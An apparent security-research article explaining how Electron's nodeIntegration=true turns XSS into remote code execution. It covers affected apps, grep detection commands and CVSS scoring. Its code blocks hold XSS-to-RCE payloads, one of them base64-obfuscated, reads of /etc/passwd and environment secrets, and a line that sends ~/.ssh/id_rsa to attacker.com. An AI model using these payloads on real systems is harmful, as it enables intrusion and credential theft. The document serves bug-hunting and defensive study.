---
title: nodeIntegration=true
description: The most dangerous Electron misconfiguration — Node.js in the renderer means any XSS is instant RCE
---

# nodeIntegration=true

`nodeIntegration: true` puts the full Node.js API — `require`, `child_process`, `fs`, `net`, all of it — directly in the renderer process. There's no contextBridge to cross, no IPC to invoke, no main process to reach. Any JavaScript that runs in the renderer can call `require('child_process').exec()`.

So when there's XSS, there's RCE. That's it. One step.

---

## What the Renderer Can Do With Node.js

```javascript
// All of this works in the renderer with nodeIntegration: true:
require('child_process').exec('calc.exe');
require('child_process').execSync('id');
require('fs').readFileSync('/etc/passwd', 'utf8');
require('fs').writeFileSync('/tmp/evil.sh', '#!/bin/bash\ncurl attacker.com/$(cat ~/.ssh/id_rsa)');
require('os').homedir();
process.env.AWS_SECRET_ACCESS_KEY;
require('net').createServer(/* bind to a port */);
```

In a normal web app, XSS gives you same-origin script execution. In an Electron app with `nodeIntegration: true`, it gives you the user's entire operating system.

---

## The Chain (One Step)

```
Any XSS → JS execution in renderer → require('child_process').exec() → OS RCE
```

There's nothing to trace, no preload to read, no IPC handler to find. If there's XSS and `nodeIntegration: true`, write the PoC:

```javascript
// Standard XSS payload — immediate RCE:
<img src=x onerror="require('child_process').exec('calc.exe')">

// Base64-encoded to avoid quote escaping issues:
<img src=x onerror="eval(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2NhbGMnKQ=='))">
// Decodes to: require('child_process').exec('calc')

// Via location.hash (useful when the app reads hash and renders it):
// URL: myapp://index.html#<img src=x onerror=require('child_process').exec('calc')>
```

---

## Why This Still Shows Up

`nodeIntegration: true` was the *default* before Electron 5.0 (released 2019). Every Electron app that was written before then — or that was written without knowledge of the security implications — had this enabled by default.

Apps that shipped with `nodeIntegration: true` at various points:

- Signal Desktop (pre-2018 security patch)
- Element/Riot Desktop (pre-2022)
- RocketChat Desktop (pre-2020)
- Joplin (multiple versions)
- SiYuan (pre-3.6.4)
- Dozens of smaller apps that never got a security review

It also shows up in apps that *explicitly set it*, usually because they migrated from pre-Electron-5 patterns and the `require()` calls in their renderer JS never got refactored. Removing `nodeIntegration: true` means rewriting renderer code to go through IPC — so some teams just leave it.

---

## How to Find It

```bash
# Explicit nodeIntegration: true:
grep -rn "nodeIntegration\s*:\s*true" --include="*.js" . | grep -v node_modules

# Check Electron version — old apps without explicit setting:
cat package.json | grep '"electron"'
# electron < 5.0.0 → nodeIntegration is true if not explicitly set to false

# BrowserWindow configs without nodeIntegration set:
grep -rn "new BrowserWindow" --include="*.js" . -A 15 | \
  grep -v node_modules | grep -v "nodeIntegration"
# Cross-reference with Electron version
```

---

## When You Find It

Finding `nodeIntegration: true` without an XSS doesn't automatically give you RCE. You still need to find where attacker-controlled content renders as JavaScript. Look for:

- `innerHTML` with unfiltered content
- Markdown renderers without DOMPurify
- `dangerouslySetInnerHTML` in React without sanitization
- `document.write()` with URL parameters
- `eval()` with any user input
- Content from network sources (API responses, WebSocket messages) rendered as HTML

Once you have XSS, the chain is complete. This is a P0/Critical finding in any program.

---

## CVSS

```
AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
Score: 9.6 (Critical)
```

The `UI:R` (user interaction required) reflects that the victim needs to trigger the XSS — open a message, load a page, click a link. If the XSS is zero-click (stored XSS that fires when loading the app), bump UI to None and the score goes to 10.0.
